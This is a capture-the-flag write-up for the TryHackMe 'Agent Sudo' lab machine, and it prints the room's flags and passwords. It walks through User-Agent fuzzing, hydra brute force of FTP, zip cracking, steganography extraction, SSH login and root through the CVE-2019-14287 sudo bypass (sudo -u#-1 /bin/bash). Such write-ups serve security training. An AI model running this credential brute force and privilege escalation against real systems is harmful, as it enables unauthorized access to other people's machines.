# Agent Sudo — TryHackMe CTF Writeup

**Author:** 0xb0rn3 | 0xbv1
**Platform:** TryHackMe
**Room:** Agent Sudo
**Difficulty:** Easy
**Target IP:** 10.49.129.194

---

## Summary

A secret server hidden in the deep sea. The mission: enumerate three open services, abuse HTTP user-agent sniffing to discover a hidden page, chain FTP credentials + zip cracking + steganography to exfil SSH credentials, land a shell as `james`, then exploit a well-known sudo misconfiguration (CVE-2019-14287) to pop root. Simple chain, clean execution.

---

## Flags

| Question | Answer |
|---|---|
| Open ports | **3** |
| Secret page redirect method | **User-Agent: C** |
| Agent codename | **C** |
| Agent real name | **chris** |
| FTP password | **crystal** |
| ZIP password | **alien** |
| Steganography password | **Area51** |
| Other agent full name | **james** |
| SSH password | **hackerrules!** |
| User flag | **b03d975e8c92a7c04146cfa7a5a313c7** |
| Incident in the photo | **Roswell alien autopsy** |
| CVE for privilege escalation | **CVE-2019-14287** |
| Root flag | **b53a02f55b57d4439e3341834d70c062** |
| Agent R real identity | **DesKel** |

---

## Reconnaissance

### Port Scan

```bash
nmap -sV -sC -T4 -p- --min-rate 3000 -Pn 10.49.129.194
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Three open ports: **21 (FTP)**, **22 (SSH)**, **80 (HTTP)**.

---

## Web Enumeration — Hidden Agent Page

Navigating to `http://10.49.129.194/` returns:

```
Dear agents,
Use your own codename as user-agent to access the site.
From,
Agent R
```

The site checks the `User-Agent` header and redirects based on agent codename. Fuzzing all single letters:

```bash
for letter in {A..Z}; do
    wget -S -O /dev/null --header="User-Agent: $letter" http://10.49.129.194/ 2>&1 | grep "Location:"
done
```

**Agent `C`** triggers a `302` redirect to `agent_C_attention.php`:

```bash
wget -O - --header="User-Agent: C" http://10.49.129.194/agent_C_attention.php
```

Response:

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, is weak!

From,
Agent R
```

**Agent C's real name: `chris`** — with a weak password.

---

## FTP Enumeration & Brute Force

Armed with the username `chris` and the knowledge that the password is weak:

```bash
hydra -l chris -P /tmp/rockyou.txt ftp://10.49.129.194 -t 10 -f
```

**FTP credentials: `chris:crystal`**

Downloading all files:

```bash
wget -r --ftp-user=chris --ftp-password=crystal ftp://10.49.129.194/
```

Files retrieved:
- `To_agentJ.txt`
- `cute-alien.jpg`
- `cutie.png`

**`To_agentJ.txt` contents:**

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your
directory. Your login password is somehow stored in the fake picture.

From,
Agent C
```

The password is hidden inside one of the images.

---

## Steganography — Cracking the Images

### Step 1 — Embedded ZIP in `cutie.png`

Using `zsteg` reveals extra data appended after the PNG's `IEND` chunk:

```bash
zsteg cutie.png
```

Output confirms a ZIP archive at offset `0x8702` (byte 34562):

```
extradata:0  .. file: Zip archive data (AES Encrypted)
             Contents: To_agentR.txt
```

Extracting the embedded ZIP:

```bash
dd if=cutie.png bs=1 skip=34562 of=hidden.zip
```

### Step 2 — Cracking the ZIP Password

```bash
zip2john hidden.zip > hash.txt
john hash.txt --format=ZIP --wordlist=/tmp/rockyou.txt
```

**ZIP password: `alien`**

Extracting with 7zip (required for AES-256 encrypted zip):

```bash
7z x -palien hidden.zip
```

**`To_agentR.txt` contents:**

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

Decoding the Base64 string:

```bash
echo "QXJlYTUx" | base64 -d
```

Output: **`Area51`** — this is the steganography password.

### Step 3 — Extracting Hidden Data from `cute-alien.jpg`

```bash
steghide extract -sf cute-alien.jpg -p "Area51"
cat message.txt
```

**`message.txt` contents:**

```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

**SSH credentials: `james:hackerrules!`**
**Other agent's full name: `james`**

---

## SSH Access — User Flag

```bash
ssh james@10.49.129.194
# Password: hackerrules!
```

```
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),...
```

```bash
cat ~/user_flag.txt
```

**User flag: `b03d975e8c92a7c04146cfa7a5a313c7`**

The home directory also contains `Alien_autospy.jpg` — the image depicts the **Roswell alien autopsy** film/incident from 1947/1995.

---

## Privilege Escalation — CVE-2019-14287

### Sudo Misconfiguration

```bash
sudo -l
```

```
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
```

This rule intends to allow james to run `/bin/bash` as any user **except root**. However, **CVE-2019-14287** (sudo < 1.8.28) allows bypassing the `!root` restriction by specifying user ID `-1` or `4294967295`, which `sudo` incorrectly resolves to UID `0` (root).

### Exploitation

```bash
sudo -u#-1 /bin/bash
```

```
id
uid=0(root) gid=1000(james) groups=1000(james)
```

Root shell obtained.

```bash
cat /root/root.txt
```

**Root flag: `b53a02f55b57d4439e3341834d70c062`**

**`/root/root.txt` full content:**

```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe.
Tips, always update your machine.

Your flag is
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```

**Agent R = DesKel**

---

## Vulnerability Summary

| Vulnerability | Impact |
|---|---|
| Weak FTP password (chris:crystal) | FTP access, file download |
| Steganography (LSB + appended ZIP) | Credential extraction |
| Hardcoded SSH credentials in steg | SSH initial access |
| CVE-2019-14287 (sudo `!root` bypass) | Local privilege escalation to root |

---

## Tools Used

- `nmap` — port scanning & service detection
- `hydra` — FTP brute force
- `wget` — FTP file retrieval
- `zsteg` — PNG steganography analysis
- `binwalk` / `dd` — embedded file extraction
- `john` — ZIP password cracking
- `7z` — AES-encrypted ZIP extraction
- `steghide` — JPEG steganography extraction
- `python3 + paramiko` — SSH command execution

---

*0xb0rn3 | 0xbv1*
